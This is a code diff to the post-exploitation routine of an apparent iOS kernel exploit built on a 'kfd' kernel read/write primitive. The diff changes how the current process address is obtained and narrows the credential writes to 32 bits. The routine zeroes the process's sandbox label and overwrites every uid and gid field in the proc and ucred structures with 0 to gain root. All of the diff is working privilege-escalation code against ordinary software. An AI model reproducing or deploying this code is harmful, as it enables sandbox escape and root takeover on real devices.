@@ -48,7 +48,7 @@ void kfd_print(char* format, ...) {
 }
 
 void postExploit(void) {
-    uint64_t proc = getProc(getpid());
+    uint64_t proc = ((struct kfd*)_kfd)->info.kaddr.current_proc;
     if (proc == -1) {
         kfd_print("Failed to get proc\n");
         return;
@@ -58,23 +58,23 @@ void postExploit(void) {
     kfd_print("ucred: 0x%llx\n", ucred);
     uint64_t label = kread64(ucred + off_u_cr_label);
     kfd_print("label: 0x%llx\n", label);
-    kfd_print("uid: %llx\n", kread64(ucred + off_u_cr_uid));
+    kfd_print("uid: %u\n", kread32(ucred + off_u_cr_uid));
     //Escape Sandbox
     kwrite64(label + 0x10, 0);
     //Get Root
-    kwrite64(proc + off_p_uid, 0);
-    kwrite64(proc + off_p_ruid, 0);
-    kwrite64(proc + off_p_gid, 0);
-    kwrite64(proc + off_p_rgid, 0);
-    kwrite64(ucred + off_u_cr_uid, 0);
-    kwrite64(ucred + off_u_cr_ruid, 0);
-    kwrite64(ucred + off_u_cr_svuid, 0);
-    kwrite64(ucred + off_u_cr_ngroups, 1);
-    kwrite64(ucred + off_u_cr_groups, 0);
-    kwrite64(ucred + off_u_cr_rgid, 0);
-    kwrite64(ucred + off_u_cr_svgid, 0);
+    kwrite32(proc + off_p_uid, 0);
+    kwrite32(proc + off_p_ruid, 0);
+    kwrite32(proc + off_p_gid, 0);
+    kwrite32(proc + off_p_rgid, 0);
+    kwrite32(ucred + off_u_cr_uid, 0);
+    kwrite32(ucred + off_u_cr_ruid, 0);
+    kwrite32(ucred + off_u_cr_svuid, 0);
+    kwrite32(ucred + off_u_cr_ngroups, 1);
+    kwrite32(ucred + off_u_cr_groups, 0);
+    kwrite32(ucred + off_u_cr_rgid, 0);
+    kwrite32(ucred + off_u_cr_svgid, 0);
     kfd_print("Done!\n");
-    kfd_print("uid: %llx\n", kread64(ucred + off_u_cr_uid));
+    kfd_print("uid: %u\n", kread32(ucred + off_u_cr_uid));
 }
 
 uint64_t getProc(pid_t pid) {
